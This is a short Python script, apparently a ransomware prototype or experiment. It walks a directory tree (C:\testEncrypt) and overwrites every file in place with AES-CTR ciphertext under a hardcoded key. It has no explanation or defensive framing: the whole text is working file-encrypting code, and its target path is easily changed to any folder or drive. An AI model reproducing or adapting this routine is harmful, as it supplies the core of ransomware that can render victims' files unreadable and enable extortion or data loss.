from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util import Counter
#from os import path
import os 
import os.path

def enc(key,fullpath):
    counter = Counter.new(128)
    c = AES.new(key,AES.MODE_CTR,counter = counter)
    with open(fullpath,'r+b') as f:
        plaintext = f.read(16)
        while plaintext:
           f.seek(-len(plaintext), 1)
           f.write(c.encrypt(plaintext))
           plaintext = f.read(16)

#key = get_random_bytes(16)
key = b'\xf9\xbb\x11\xf6\x1a\xf8?R\xd9\xeb\xc5\xdd\\d\n\xf5'

#To encrypt files:
#enc(key,r"C:\testEncrypt\test1.txt") 


for dir,subdir,files in os.walk(r"C:\testEncrypt"):
    for file in files:
        fullpath = os.path.join(dir,file)
        print(fullpath)
        enc(key,fullpath)

